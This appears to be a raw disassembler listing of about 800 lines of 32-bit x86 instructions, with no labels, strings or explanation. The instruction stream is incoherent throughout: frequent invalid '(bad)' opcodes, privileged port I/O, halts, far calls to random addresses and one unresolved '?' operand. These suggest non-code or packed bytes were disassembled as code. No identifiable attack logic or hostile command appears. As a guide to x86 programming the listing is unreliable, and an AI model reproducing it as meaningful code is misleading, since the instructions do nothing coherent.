  41df1d:	shr    DWORD PTR ds:0xfbe68b84,cl
  41df23:	out    dx,eax
  41df24:	cdq    
  41df25:	adc    al,0xf9
  41df27:	cwde   
  41df28:	cmp    BYTE PTR ds:0xfca653ac,ch
  41df2e:	test   BYTE PTR [ebx+0x6c],ah
  41df31:	icebp  
  41df32:	in     al,0xd8
  41df34:	adc    al,0x8f
  41df36:	loope  0x41dedd
  41df38:	hlt    
  41df39:	mov    eax,0xdad62cd1
  41df3e:	aam    0xad
  41df40:	push   edx
  41df41:	dec    edx
  41df42:	dec    ebx
  41df43:	and    BYTE PTR [esi+0x7c],0x17
  41df47:	(bad)  
  41df48:	xor    BYTE PTR [ecx+0x64],bh
  41df4b:	popf   
  41df4c:	fucom  st(0)
  41df4e:	inc    esi
  41df4f:	or     edi,0x20e49bb2
  41df55:	jge    0x41df18
  41df57:	sbb    al,0x8c
  41df59:	mov    ch,0xee
  41df5b:	pop    ecx
  41df5c:	ins    BYTE PTR es:[edi],dx
  41df5d:	dec    ebp
  41df5e:	rol    ebp,0x46
  41df61:	mov    ebp,0x5bf4e9d6
  41df66:	mov    dh,BYTE PTR [edi+0x36a45b8d]
  41df6c:	scas   al,BYTE PTR es:[edi]
  41df6d:	idiv   BYTE PTR [edx-0x1c]
  41df70:	xchg   BYTE PTR [eax+0xb],dh
  41df73:	pop    ds
  41df74:	out    dx,al
  41df75:	ret    
  41df76:	dec    esi
  41df77:	or     BYTE PTR [ebx+0x4e2da038],al
  41df7d:	and    eax,0xdcb7a169
  41df82:	bound  esi,QWORD PTR [eax-0x7c]
  41df85:	cli    
  41df86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df87:	xor    edi,eax
  41df89:	rcr    DWORD PTR [edx],cl
  41df8b:	fs sub eax,esp
  41df8e:	ficomp DWORD PTR [edx+0x14940cbc]
  41df94:	test   BYTE PTR [ecx-0x59],dl
  41df97:	into   
  41df98:	das    
  41df99:	add    al,0xc5
  41df9b:	not    DWORD PTR [esi]
  41df9d:	dec    ebx
  41df9e:	cmp    al,0x2f
  41dfa0:	pop    ecx
  41dfa1:	fstp   DWORD PTR [esi+ebx*2+0x4a914487]
  41dfa8:	lea    esi,ds:0xc39f57f1
  41dfae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfaf:	mov    bl,0xc4
  41dfb1:	jbe    0x41dfcb
  41dfb3:	mov    bh,0xa9
  41dfb5:	or     bl,0x4f
  41dfb8:	popf   
  41dfb9:	pop    ebx
  41dfba:	fist   WORD PTR [esi-0x2abfacb3]
  41dfc0:	or     al,0xf7
  41dfc2:	pop    edi
  41dfc3:	add    dl,BYTE PTR [esi+0x33]
  41dfc6:	xchg   edi,eax
  41dfc7:	ds xor al,0xec
  41dfca:	xchg   esi,eax
  41dfcb:	push   ebp
  41dfcc:	lock inc ecx
  41dfce:	mov    al,ds:0x9b1ae9d9
  41dfd3:	sbb    BYTE PTR [esi-0x6a80b539],ah
  41dfd9:	fs retf 
  41dfdb:	mov    ah,0xeb
  41dfdd:	das    
  41dfde:	and    DWORD PTR [edx-0x12ef684],edi
  41dfe4:	(bad)  
  41dfe5:	data16 outs dx,BYTE PTR ds:[esi]
  41dfe7:	inc    ebp
  41dfe8:	mov    ah,0x76
  41dfea:	in     al,dx
  41dfeb:	sar    DWORD PTR [eax],0x3
  41dfee:	rol    DWORD PTR [esi-0xd49e122],cl
  41dff4:	lea    ebx,[esi+0x168d7490]
  41dffa:	or     BYTE PTR [esi-0xb],ah
  41dffd:	stos   DWORD PTR es:[edi],eax
  41dffe:	mul    ch
  41e000:	out    0x7f,eax
  41e002:	aad    0x7c
  41e004:	push   ds
  41e005:	mov    esp,0xaf6127a0
  41e00a:	rcr    cl,0xec
  41e00d:	out    0x9d,al
  41e00f:	bound  esi,QWORD PTR [ebp-0x65]
  41e012:	not    BYTE PTR [ebx-0x1]
  41e015:	xchg   edi,eax
  41e016:	sahf   
  41e017:	add    eax,0x3a833620
  41e01c:	jmp    0x68cc6d45
  41e021:	imul   edi,ecx,0x2f
  41e024:	int    0x50
  41e026:	jne    0x41e088
  41e028:	dec    edi
  41e029:	imul   DWORD PTR [edi+0x4b]
  41e02c:	dec    esi
  41e02d:	pop    esp
  41e02e:	xchg   ebp,eax
  41e02f:	sbb    eax,0x9b16fb78
  41e035:	shl    DWORD PTR [eax+0x316f4d6c],1
  41e03b:	in     al,dx
  41e03c:	mov    ds:0x570240df,al
  41e041:	or     BYTE PTR [ecx-0x2795aa51],bl
  41e047:	int3   
  41e048:	jle    0x41e074
  41e04a:	imul   ecx,edx,0xffffffd0
  41e04d:	fnstcw WORD PTR [edi-0x52]
  41e050:	mov    BYTE PTR [edi+0x775507f8],ah
  41e056:	mov    ds:0xdc75019a,eax
  41e05b:	sbb    bh,BYTE PTR [edx-0x47]
  41e05e:	pop    esp
  41e05f:	push   ss
  41e060:	mov    WORD PTR [eax+ebx*8],es
  41e063:	and    eax,0x4ffdaba0
  41e068:	or     BYTE PTR [bp-0xfb1],al
  41e06d:	(bad)  
  41e06e:	loopne 0x41e0ce
  41e070:	cmp    dl,dl
  41e072:	(bad)  
  41e073:	mov    ecx,0xcf4f54b4
  41e078:	jnp    0x41e027
  41e07a:	js     0x41e033
  41e07c:	or     DWORD PTR [ebx],ebp
  41e07e:	pop    esi
  41e07f:	retf   0x2427
  41e082:	loope  0x41e072
  41e084:	mov    DWORD PTR [esi+eiz*1-0x71c79fd4],ebp
  41e08b:	(bad)  
  41e08c:	sbb    edi,eax
  41e08e:	call   0x80af26b9
  41e093:	jl     0x41e102
  41e095:	mov    bh,0xbe
  41e097:	add    DWORD PTR [eax],esi
  41e099:	fst    DWORD PTR [edx]
  41e09b:	(bad)  
  41e09c:	iret   
  41e09d:	inc    esi
  41e09e:	(bad)  
  41e09f:	(bad)  
  41e0a0:	xlat   BYTE PTR ds:[ebx]
  41e0a1:	icebp  
  41e0a2:	ror    DWORD PTR [edi],0x7e
  41e0a5:	test   al,0x13
  41e0a7:	sub    BYTE PTR [edi],0xce
  41e0aa:	cmp    DWORD PTR [eax-0x53],edi
  41e0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ae:	adc    ah,cl
  41e0b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0b1:	and    ebp,DWORD PTR [eax-0x20ba5f83]
  41e0b7:	out    0xc7,al
  41e0b9:	inc    edx
  41e0ba:	dec    eax
  41e0bb:	mov    bl,0xea
  41e0bd:	out    0x85,eax
  41e0bf:	out    dx,al
  41e0c0:	stc    
  41e0c1:	test   eax,0xd4c83099
  41e0c6:	lock (bad) 
  41e0c8:	mov    edx,0x1f1a89fe
  41e0cd:	sbb    ah,al
  41e0cf:	in     eax,0xb1
  41e0d1:	sub    ebx,DWORD PTR [edx]
  41e0d3:	fdiv   st,st(3)
  41e0d5:	scas   eax,DWORD PTR es:[edi]
  41e0d6:	ret    0xd835
  41e0d9:	xchg   esp,eax
  41e0da:	cmp    esp,edx
  41e0dc:	cmc    
  41e0dd:	mov    dh,0xf8
  41e0df:	mov    al,dh
  41e0e1:	xor    eax,0x3969e059
  41e0e6:	mov    al,0x19
  41e0e8:	stos   DWORD PTR es:[edi],eax
  41e0e9:	sub    ch,0xc2
  41e0ec:	hlt    
  41e0ed:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ef:	push   ebx
  41e0f0:	icebp  
  41e0f1:	sar    ch,cl
  41e0f3:	push   esp
  41e0f4:	stc    
  41e0f5:	push   edi
  41e0f6:	push   0xffffff86
  41e0f8:	cdq    
  41e0f9:	cmp    ch,BYTE PTR [esi]
  41e0fb:	repnz nop
  41e0fd:	fwait
  41e0fe:	js     0x41e0b5
  41e100:	cmp    esp,eax
  41e102:	loop   0x41e0fe
  41e104:	or     dl,bl
  41e106:	dec    esi
  41e107:	sub    al,BYTE PTR [edi]
  41e109:	js     0x41e0dd
  41e10b:	adc    ebp,DWORD PTR [edi-0x3d]
  41e10e:	push   cs
  41e10f:	stos   BYTE PTR es:[edi],al
  41e110:	pushf  
  41e111:	repz pop es
  41e113:	aad    0x7
  41e115:	xlat   BYTE PTR ds:[ebx]
  41e116:	cwde   
  41e117:	jae    0x41e09d
  41e119:	loope  0x41e17f
  41e11b:	cmp    edi,DWORD PTR [ecx+0x3718a2d7]
  41e121:	out    dx,al
  41e122:	aam    0xd1
  41e124:	shl    dh,0x83
  41e127:	pop    eax
  41e128:	cmp    eax,0x84796435
  41e12d:	std    
  41e12e:	cmp    DWORD PTR [ecx+0x1494ceaf],0x7a
  41e135:	int    0x0
  41e137:	sbb    bl,BYTE PTR [edi+esi*4-0x1]
  41e13b:	sti    
  41e13c:	mov    eax,0x61450bc6
  41e141:	xor    cl,al
  41e143:	sub    al,0xff
  41e145:	test   eax,0x7bed226
  41e14a:	cld    
  41e14b:	daa    
  41e14c:	or     al,BYTE PTR [ebx+0x40]
  41e14f:	mov    esi,0x67ec761
  41e154:	mov    al,0xe4
  41e156:	sbb    DWORD PTR [esi-0x7ac58467],0xf72e1e9
  41e160:	or     ebp,DWORD PTR [ebx+0x17a50a7e]
  41e166:	int    0xd9
  41e168:	pop    es
  41e169:	pop    eax
  41e16a:	or     eax,DWORD PTR [eax]
  41e16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e16d:	test   DWORD PTR [eax-0x80],ecx
  41e170:	scas   eax,DWORD PTR es:[edi]
  41e171:	adc    ah,BYTE PTR [ebp-0x36]
  41e174:	ins    BYTE PTR es:[edi],dx
  41e175:	call   0x8c1:0x8f0116e4
  41e17c:	and    dl,BYTE PTR [esp+edx*1+0x39efa449]
  41e183:	xchg   ecx,eax
  41e184:	mov    ch,0xc3
  41e186:	mov    ch,0xd8
  41e188:	cmp    eax,0xfaddbb3
  41e18d:	fistp  QWORD PTR [eax]
  41e18f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e190:	ret    0x67d0
  41e193:	fcomp  QWORD PTR [ecx]
  41e195:	push   0x3f3b2e0e
  41e19a:	add    ebx,DWORD PTR [eax+0x1951a2b1]
  41e1a0:	inc    eax
  41e1a1:	mov    es,esp
  41e1a3:	mov    ebp,0x1233ddf5
  41e1a8:	mov    ds:0x38b12bba,eax
  41e1ad:	retf   0xca6f
  41e1b0:	pop    esi
  41e1b1:	jno    0x41e219
  41e1b3:	imul   edi,DWORD PTR es:[esi+0x241d0f29],0xd10514d2
  41e1be:	sar    BYTE PTR [ecx+0x45],cl
  41e1c1:	pop    ebp
  41e1c2:	xor    edi,DWORD PTR [edx+0x4f]
  41e1c5:	pop    ebx
  41e1c6:	adc    BYTE PTR [edx+0x722432e],bh
  41e1cc:	ds and ch,bl
  41e1cf:	and    DWORD PTR ss:[ebx-0x72],esp
  41e1d3:	scas   al,BYTE PTR es:[edi]
  41e1d4:	cli    
  41e1d5:	iret   
  41e1d6:	cmc    
  41e1d7:	ja     0x41e1e0
  41e1d9:	inc    eax
  41e1da:	xchg   esi,eax
  41e1db:	mov    edi,0x5b2a75e
  41e1e0:	lahf   
  41e1e1:	or     al,0xae
  41e1e3:	hlt    
  41e1e4:	mov    ecx,0x19edc78c
  41e1e9:	ins    BYTE PTR es:[edi],dx
  41e1ea:	sbb    esp,DWORD PTR [esi+eiz*8-0x1aa941ba]
  41e1f1:	dec    ebx
  41e1f2:	out    dx,al
  41e1f3:	add    ecx,DWORD PTR [ecx+0x7]
  41e1f6:	xor    ch,cl
  41e1f8:	lods   al,BYTE PTR ds:[esi]
  41e1f9:	push   0xae8a9a0
  41e1fe:	mov    ecx,0xe5773dac
  41e203:	and    bh,BYTE PTR [ecx+0x5cb1a140]
  41e209:	push   ebx
  41e20a:	xor    al,0x7a
  41e20c:	sub    DWORD PTR [esi*4+0x700f6c47],esp
  41e213:	hlt    
  41e214:	cmp    al,BYTE PTR cs:[edx+0x52]
  41e218:	je     0xfd1fed76
  41e21e:	imul   esp,DWORD PTR [esi-0x7b3a4f9d],0xa125509b
  41e228:	jbe    0x41e1da
  41e22a:	push   es
  41e22b:	add    DWORD PTR [ebx],0xfffffffe
  41e22e:	mov    dh,0xc5
  41e230:	sub    BYTE PTR [eax-0x51],al
  41e233:	sub    cl,BYTE PTR [esp+eiz*2+0x5d]
  41e237:	cli    
  41e238:	jg     0x41e217
  41e23a:	xor    al,0xaf
  41e23c:	ins    BYTE PTR es:[edi],dx
  41e23d:	adc    bl,BYTE PTR [ebp-0x47]
  41e240:	ja     0x41e265
  41e242:	sbb    al,0xdb
  41e244:	jae    0x41e204
  41e246:	xor    al,0xbf
  41e248:	xor    DWORD PTR [ebx],edi
  41e24a:	sub    esp,DWORD PTR [edi-0x31]
  41e24d:	add    al,0x91
  41e24f:	dec    ebp
  41e250:	cmp    al,BYTE PTR [ebx+0x78a3d4e6]
  41e256:	inc    ecx
  41e257:	mov    ebp,0x9cedfc24
  41e25c:	js     0x41e263
  41e25e:	push   ecx
  41e25f:	outs   dx,DWORD PTR ds:[esi]
  41e260:	hlt    
  41e261:	push   edi
  41e262:	mov    eax,0x91c87819
  41e267:	dec    edx
  41e268:	ins    BYTE PTR es:[edi],dx
  41e269:	and    al,0xac
  41e26b:	jo     0x41e2c5
  41e26d:	dec    esi
  41e26e:	inc    esp
  41e26f:	sub    al,ah
  41e271:	push   ecx
  41e272:	cs jp  0x41e245
  41e275:	fstp   TBYTE PTR [ecx]
  41e277:	push   ecx
  41e278:	ins    DWORD PTR es:[edi],dx
  41e279:	lods   eax,DWORD PTR ds:[esi]
  41e27a:	arpl   WORD PTR [ebx],si
  41e27c:	inc    ebp
  41e27d:	inc    esi
  41e27e:	je     0x41e2ec
  41e280:	sbb    DWORD PTR ds:[ebx+esi*1+0x3efa46c],ebx
  41e288:	xchg   DWORD PTR [ebx],ecx
  41e28a:	sbb    BYTE PTR [edx],dh
  41e28c:	mov    al,0xf6
  41e28e:	enter  0xfb2,0x9a
  41e292:	ins    BYTE PTR es:[edi],dx
  41e293:	pop    ss
  41e294:	sub    eax,0x5f065699
  41e299:	cmp    bl,al
  41e29b:	or     DWORD PTR [edx],ebp
  41e29d:	mov    al,ds:0xab40f681
  41e2a2:	lods   al,BYTE PTR ds:[esi]
  41e2a3:	leave  
  41e2a4:	xchg   esp,eax
  41e2a5:	lea    esp,[edx]
  41e2a7:	fs stos BYTE PTR es:[edi],al
  41e2a9:	(bad)
  41e2ac:	int3   
  41e2ad:	fdivr  st,st(1)
  41e2af:	call   0x88777e74
  41e2b4:	mov    esp,0x751a7330
  41e2b9:	mov    dh,0x9f
  41e2bb:	push   esp
  41e2bc:	sti    
  41e2bd:	hlt    
  41e2be:	mov    ecx,edx
  41e2c0:	loop   0x41e286
  41e2c2:	pop    edi
  41e2c3:	test   BYTE PTR [ebx-0x3a75ad5],dh
  41e2c9:	mov    esp,0x28caeca1
  41e2ce:	adc    al,0x13
  41e2d0:	xchg   DWORD PTR [ebx-0x33],edi
  41e2d3:	sbb    al,0xe5
  41e2d5:	cmp    eax,0x81dced7
  41e2da:	and    al,0x1c
  41e2dc:	jg     0x41e2fc
  41e2de:	dec    eax
  41e2df:	mov    ah,0x4d
  41e2e1:	test   eax,0x3e44f54c
  41e2e6:	(bad)  
  41e2e7:	jmp    0x93ef4891
  41e2ec:	cli    
  41e2ed:	mov    ebx,0xe69061b
  41e2f2:	sbb    eax,0x2c969a0e
  41e2f7:	jge    0x41e2fc
  41e2f9:	adc    eax,0xf60f0b90
  41e2fe:	ja     0x41e361
  41e300:	enter  0x1ad0,0x7e
  41e304:	gs call 0xd4de:0x12949a3a
  41e30c:	cmp    ebx,ecx
  41e30e:	adc    eax,DWORD PTR [edi]
  41e310:	dec    eax
  41e311:	sub    edx,edi
  41e313:	ja     0x41e374
  41e315:	sub    BYTE PTR [ebx+esi*8-0x4bb43a3f],0xcd
  41e31d:	inc    edx
  41e31e:	push   0xbff91bc7
  41e323:	mov    ah,0x13
  41e325:	sti    
  41e326:	je     0x41e308
  41e328:	inc    ebx
  41e329:	mov    eax,ds:0x83d3aaaf
  41e32e:	nop
  41e32f:	clc    
  41e330:	pop    eax
  41e331:	lds    edi,FWORD PTR [ecx]
  41e333:	jnp    0x41e31e
  41e335:	es pop ebx
  41e337:	mov    ch,BYTE PTR [eax-0x42714c4c]
  41e33d:	push   edi
  41e33e:	cmp    BYTE PTR [edi],dh
  41e340:	cmp    DWORD PTR [ebx],ebx
  41e342:	outs   dx,BYTE PTR ds:[esi]
  41e343:	imul   ebp,DWORD PTR [ebp-0x76],0x61
  41e347:	test   DWORD PTR [eax],edx
  41e349:	adc    BYTE PTR [esi],al
  41e34b:	jle    0x41e2e6
  41e34d:	fs cwde 
  41e34f:	aas    
  41e350:	or     bl,BYTE PTR [ecx]
  41e352:	xchg   DWORD PTR [esi-0x77],esp
  41e355:	enter  0x198c,0x6a
  41e359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e35a:	rol    ch,1
  41e35c:	stos   BYTE PTR es:[edi],al
  41e35d:	sub    al,0xf9
  41e35f:	mov    esi,0xd83de7a9
  41e364:	mov    ebx,DWORD PTR [esp+eiz*8]
  41e367:	(bad)  
  41e369:	lock jp 0x41e35c
  41e36c:	fistp  DWORD PTR [edx+0x5b]
  41e36f:	sub    DWORD PTR [ebp+0x669e950a],ebp
  41e375:	mov    bh,0xb3
  41e377:	icebp  
  41e378:	idiv   edi
  41e37a:	lds    ebx,FWORD PTR [edx]
  41e37c:	mov    fs,WORD PTR [edi-0x45]
  41e37f:	adc    cl,BYTE PTR [ebp-0x74]
  41e382:	stc    
  41e383:	or     BYTE PTR [esi-0x38],dl
  41e386:	repnz mov ah,0xe7
  41e389:	lods   eax,DWORD PTR ds:[esi]
  41e38a:	or     ah,BYTE PTR [ebx+0x1c7dc1fd]
  41e390:	neg    dh
  41e392:	sub    al,0xc0
  41e394:	mov    edx,0xb8bcac2b
  41e399:	fdivr  QWORD PTR [ebx]
  41e39b:	int3   
  41e39c:	mov    WORD PTR [ebx-0x51b17a54],fs
  41e3a2:	fisttp QWORD PTR [eax+0x1850f71e]
  41e3a8:	enter  0x435b,0x49
  41e3ac:	xchg   ecx,eax
  41e3ad:	mov    ss,WORD PTR [ecx-0x2f75c8ee]
  41e3b3:	int    0xf
  41e3b5:	ror    BYTE PTR [eax+eiz*4],1
  41e3b8:	shl    esp,0xef
  41e3bb:	aaa    
  41e3bc:	add    ah,BYTE PTR [ecx+ecx*2+0x7c53ddf8]
  41e3c3:	sahf   
  41e3c4:	adc    BYTE PTR [esp+esi*4-0x10],dl
  41e3c8:	sti    
  41e3c9:	dec    esp
  41e3ca:	pusha  
  41e3cb:	popa   
  41e3cc:	cmp    eax,0x1fe0ade3
  41e3d1:	fisubr DWORD PTR [esi]
  41e3d3:	stos   BYTE PTR es:[edi],al
  41e3d4:	and    BYTE PTR [edx],0x6b
  41e3d7:	aam    0x6f
  41e3d9:	shr    BYTE PTR [edx+0x2e24224a],0xa3
  41e3e0:	iret   
  41e3e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e2:	add    eax,esp
  41e3e4:	loop   0x41e403
  41e3e6:	xlat   BYTE PTR ds:[ebx]
  41e3e7:	rol    esp,0x89
  41e3ea:	retf   
  41e3eb:	outs   dx,DWORD PTR ds:[esi]
  41e3ec:	aad    0x8b
  41e3ee:	retf   
  41e3ef:	xor    edx,DWORD PTR [esi-0x2]
  41e3f2:	and    cl,BYTE PTR [eax-0x6a460c16]
  41e3f8:	hlt    
  41e3f9:	(bad)
  41e3fe:	lods   eax,DWORD PTR ds:[esi]
  41e3ff:	lods   al,BYTE PTR ds:[esi]
  41e400:	lods   al,BYTE PTR ds:[esi]
  41e401:	pushf  
  41e402:	lds    ebx,FWORD PTR [ebp-0x79]
  41e405:	mov    BYTE PTR [ebp+0x1dd23235],ch
  41e40b:	pushf  
  41e40c:	xor    BYTE PTR [ebx],dl
  41e40e:	or     DWORD PTR [ebx-0x54237386],ebx
  41e414:	outs   dx,DWORD PTR ds:[esi]
  41e415:	jmp    0x3fb85e3b
  41e41a:	mov    ds:0x4e24ab38,al
  41e41f:	xor    BYTE PTR ds:0xb520aed2,bh
  41e425:	in     al,dx
  41e426:	bound  esp,QWORD PTR [ebp+0x7c]
  41e429:	repnz mov ebp,0xdcac8d75
  41e42f:	jb     0x41e3c4
  41e431:	xor    al,0x90
  41e433:	int    0x74
  41e435:	ins    DWORD PTR es:[edi],dx
  41e436:	xchg   esp,eax
  41e437:	outs   dx,BYTE PTR ds:[esi]
  41e438:	push   ecx
  41e439:	mov    cl,0x2a
  41e43b:	imul   ebp,DWORD PTR [esi-0x1b1ff5a4],0x7a
  41e442:	xchg   edx,eax
  41e443:	jl     0x41e3fb
  41e445:	dec    ecx
  41e446:	xchg   ecx,eax
  41e447:	enter  0x515e,0x1a
  41e44b:	pop    ds
  41e44c:	scas   eax,DWORD PTR es:[edi]
  41e44d:	sbb    eax,0xd903ff9a
  41e452:	pushf  
  41e453:	or     DWORD PTR [ebp*2+0x7bf8534e],esp
  41e45a:	xor    BYTE PTR [edx-0x2b6dd335],dh
  41e460:	cmp    al,BYTE PTR [eax+0x7f]
  41e463:	fdivr  QWORD PTR es:[ebx]
  41e466:	retf   
  41e467:	pop    ebp
  41e468:	fwait
  41e469:	(bad)
  41e46c:	mov    esp,0x81104b15
  41e471:	rcl    DWORD PTR [esi+0x1f],cl
  41e474:	sub    al,0xdc
  41e476:	in     eax,dx
  41e477:	cs jg  0x41e488
  41e47a:	imul   eax,DWORD PTR [esi],0x5e4f1835
  41e480:	imul   esi,DWORD PTR [edi],0xfffffff1
  41e483:	retf   0xd3fd
  41e486:	out    0x9,al
  41e488:	test   al,0x2d
  41e48a:	xchg   ebp,eax
  41e48b:	inc    esp
  41e48c:	sub    eax,0xcf66d8a9
  41e491:	adc    cl,BYTE PTR [esi]
  41e493:	jbe    0x41e513
  41e495:	pop    ebp
  41e496:	mov    esi,0x3a71d0fd
  41e49b:	es pop es
  41e49d:	mov    BYTE PTR [edx-0x52e943d0],0xb1
  41e4a4:	jno    0x41e509
  41e4a6:	retf   
  41e4a7:	jle    0x41e4ca
  41e4a9:	pop    ebp
  41e4aa:	jl     0x41e43a
  41e4ac:	adc    al,0xfe
  41e4ae:	dec    ecx
  41e4af:	cmp    edx,DWORD PTR [ecx+0x12395a37]
  41e4b5:	xchg   edx,eax
  41e4b6:	add    eax,ecx
  41e4b8:	leave  
  41e4b9:	push   ebx
  41e4ba:	inc    DWORD PTR [ebp-0x37fd81b]
  41e4c0:	jae    0x41e4b1
  41e4c2:	mov    ebx,0x8c4ebc0c
  41e4c7:	fidiv  WORD PTR [eax]
  41e4c9:	pop    ds
  41e4ca:	cwde   
  41e4cb:	stos   DWORD PTR es:[edi],eax
  41e4cc:	call   0x56cc:0x91452e01
  41e4d3:	int3   
  41e4d4:	dec    esp
  41e4d5:	lea    edi,[ebx-0x7357b381]
  41e4db:	inc    ebx
  41e4dc:	add    DWORD PTR [eax-0x4dafc3d5],edx
  41e4e2:	in     eax,dx
  41e4e3:	jns    0x41e4b4
  41e4e5:	dec    ebp
  41e4e6:	in     al,dx
  41e4e7:	(bad)  
  41e4e8:	push   edx
  41e4e9:	xor    al,0x3
  41e4eb:	aas    
  41e4ec:	stc    
  41e4ed:	push   es
  41e4ee:	mov    ebx,0x64009c88
  41e4f3:	mov    al,ds:0x9da6a394
  41e4f8:	add    ebx,DWORD PTR [edx]
  41e4fa:	(bad)  
  41e4fc:	inc    ecx
  41e4fd:	cdq    
  41e4fe:	into   
  41e4ff:	dec    eax
  41e500:	fild   DWORD PTR [ecx]
  41e502:	mov    dl,BYTE PTR [edx+0x4d]
  41e505:	int3   
  41e506:	sub    bl,0x8e
  41e509:	sti    
  41e50a:	sub    al,0x74
  41e50c:	aad    0xfa
  41e50e:	jl     0x41e56c
  41e510:	xchg   edi,eax
  41e511:	dec    ebx
  41e512:	sbb    dh,BYTE PTR [esi-0x53dc732b]
  41e518:	pop    ecx
  41e519:	leave  
  41e51a:	mov    cs,WORD PTR [edi+ebx*2-0x7304d30]
  41e521:	cmp    DWORD PTR [ebx],0x2e0839f9
  41e527:	adc    DWORD PTR [ecx],ebx
  41e529:	jmp    0x41e569
  41e52b:	cmp    DWORD PTR [ecx-0x3c],ebp
  41e52e:	fadd   QWORD PTR [esi]
  41e530:	xchg   BYTE PTR [ebx],al
  41e532:	xchg   edx,eax
  41e533:	daa    
  41e534:	adc    eax,0xa3f88581
  41e539:	push   esp
  41e53a:	xor    al,BYTE PTR [ebx]
  41e53c:	call   0x166c0f88
  41e541:	dec    eax
  41e542:	cld    
  41e543:	das    
  41e544:	sub    ebx,DWORD PTR [ebp+0x69ae6586]
  41e54a:	xchg   esi,eax
  41e54b:	inc    ebx
  41e54c:	adc    edx,DWORD PTR ds:[eax]
  41e54f:	dec    ebp
  41e550:	int    0x37
  41e552:	xlat   BYTE PTR ds:[ebx]
  41e553:	mov    dl,0x60
  41e555:	jmp    0x41e4d7
  41e557:	retf   
  41e558:	js     0x41e537
  41e55a:	push   ds
  41e55b:	mov    ch,0x50
  41e55d:	loopne 0x41e4fb
  41e55f:	cld    
  41e560:	mov    eax,0x4bae34f3
  41e565:	pop    esp
  41e566:	mov    ebp,0xbda171d1
  41e56b:	push   ebx
  41e56c:	xchg   ebp,eax
  41e56d:	mov    bh,0xf0
  41e56f:	jae    0x41e5a8
  41e571:	outs   dx,BYTE PTR ds:[esi]
  41e572:	rcl    BYTE PTR ds:0x82edf047,1
  41e578:	fidiv  WORD PTR [edi-0x70]
  41e57b:	xchg   ebx,eax
  41e57c:	out    dx,al
  41e57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e57e:	hlt    
  41e57f:	mov    ebp,DWORD PTR [esi+0x1]
  41e582:	inc    ebx
  41e583:	fwait
  41e584:	and    BYTE PTR [edx],cl
  41e586:	adc    eax,0x148c4b48
  41e58b:	out    dx,al
  41e58c:	xchg   edi,eax
  41e58d:	jp     0x41e5b3
  41e58f:	call   0x6974c07b
  41e594:	loope  0x41e600
  41e596:	sub    esp,esp
  41e598:	(bad)  [edx+eax*8-0x35]
  41e59c:	sahf   
  41e59d:	push   esi
  41e59e:	xchg   ebp,eax
  41e59f:	cmp    DWORD PTR [eax+0x14374cba],eax
  41e5a5:	popa   
  41e5a6:	rol    BYTE PTR [ebx+0x7d],1
  41e5a9:	xor    ebp,eax
  41e5ab:	mov    edi,0x9ceea941
  41e5b0:	inc    ebx
  41e5b1:	push   0xe1c2c881
  41e5b6:	into   
  41e5b7:	arpl   WORD PTR [ecx],bp
  41e5b9:	sbb    esi,esi
  41e5bb:	test   al,0xfa
  41e5bd:	stos   DWORD PTR es:[edi],eax
  41e5be:	cmp    eax,0x31d46575
  41e5c3:	sbb    DWORD PTR [ecx],eax
  41e5c5:	cmp    bh,BYTE PTR [esi+0x41f188c1]
  41e5cb:	push   edi
  41e5cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5cd:	aad    0xfa
  41e5cf:	inc    edi
  41e5d0:	test   al,0xd7
  41e5d2:	inc    ebp
  41e5d3:	xchg   ecx,eax
  41e5d4:	xchg   edx,eax
  41e5d5:	scas   al,BYTE PTR es:[edi]
  41e5d6:	(bad)  
  41e5d8:	jge    0x41e620
  41e5da:	inc    esi
  41e5db:	push   es
  41e5dc:	mov    eax,0x9f752b16
  41e5e1:	(bad)  [eax+0x45]
  41e5e4:	(bad)  
  41e5e6:	jns    0x41e597
  41e5e8:	test   BYTE PTR [esi],dh
  41e5ea:	xchg   ecx,eax
  41e5eb:	mov    cl,0x1e
  41e5ed:	dec    ecx
  41e5ee:	jnp    0x41e605
  41e5f0:	hlt    
  41e5f1:	push   0x7c
  41e5f3:	test   eax,0xfbbbc4db
  41e5f8:	(bad)  
  41e5f9:	sub    BYTE PTR ds:0xd2e543e8,dl
  41e5ff:	jbe    0x41e666
  41e601:	es push ds
  41e603:	aad    0x98
  41e605:	or     edx,edx
  41e607:	push   edx
  41e608:	mov    eax,ds:0xea35bf5a
  41e60d:	repnz mov ebp,edx
  41e610:	lods   al,BYTE PTR ds:[esi]
  41e611:	mov    ?,WORD PTR [edx]
  41e613:	loop   0x41e682
  41e615:	sub    al,0x6d
  41e617:	call   0x4d08:0x1a05f202
  41e61e:	or     ebx,DWORD PTR [esp+edx*2-0x680b62a1]
  41e625:	cmp    eax,0xccc012f5
  41e62a:	mov    ebp,fs
  41e62c:	xor    DWORD PTR [esi+eiz*2+0x22de0326],ebp
  41e633:	cli    
  41e634:	aam    0x6d
  41e636:	rol    esi,1
  41e638:	imul   ecx,DWORD PTR [edx-0x5b0b49c8],0x41
  41e63f:	(bad)  
  41e640:	jno    0x41e5d4
  41e642:	mov    ah,0x1c
  41e644:	xchg   ecx,eax
  41e645:	jno    0x41e60b
  41e647:	hlt    
  41e648:	mov    bh,0xda
  41e64a:	loope  0x41e660
  41e64c:	jle    0x41e604
  41e64e:	out    0xb0,al
  41e650:	jne    0x41e6bd
  41e652:	jbe    0x41e66b
  41e654:	add    BYTE PTR [ecx+0x27bae8ed],bh
  41e65a:	out    dx,al
  41e65b:	sbb    dh,al
  41e65d:	ins    BYTE PTR es:[edi],dx
  41e65e:	inc    ecx
  41e65f:	nop
  41e660:	in     al,0x67
  41e662:	and    ch,al
  41e664:	jns    0x41e669
  41e666:	cmp    BYTE PTR [eax],dh
  41e668:	out    0x3,eax
  41e66a:	pushf  
  41e66b:	out    0x28,al
  41e66d:	in     eax,dx
  41e66e:	repnz into 
  41e670:	pop    esp
  41e671:	or     al,0x83
  41e673:	xor    eax,0xc7e2f450
